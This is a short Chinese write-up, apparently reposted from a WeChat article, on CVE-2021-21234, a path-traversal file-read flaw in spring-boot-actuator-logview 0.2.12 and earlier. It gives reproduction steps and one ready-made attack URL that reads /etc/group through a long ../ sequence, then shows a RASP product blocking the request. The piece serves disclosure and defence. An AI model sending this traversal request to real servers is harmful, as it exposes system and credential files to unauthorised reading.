RASP | SpringBoot Actuator Logview 任意文件读取(CVE-2021-21234)

原文：http://mp.weixin.qq.com/s?__biz=Mzg5MjQ1OTkwMg==&mid=2247484153&idx=1&sn=843cbbdf0fe19f4387e7611255c025c5&chksm=c03c8ce8f74b05fefaffdf7bd7b05d1b82616ef5bc3eccd95f3e0b502f212901ed27589b718f&scene=126&sessionid=1681366120#rd

漏洞简介

spring-boot-actuator-logview 允许文件名和文件夹通过请求参数指定，没有对文件夹路径进行校验，利用文件对路径穿越，造成任意文件下载漏洞。

影响版本

spring-boot-actuator-logview <= 0.2.12

漏洞复现

  • 下载代码：代码工程  (gitee)(opens new window)

  • 执行mvn clean package 生成jar包

  • java -jar ./target/spring-boot-hello-world-example-0.0.1-SNAPSHOT.jar

  • 发起攻击

    http://localhost:8887/manage/log/view?filename=/etc/group&base=../../../../../../../../../../../../../../../../

  • 攻击结果

RASP防护

  • 再次发起相同请求，请求被阻断

  • RASP截获http参数和调用栈
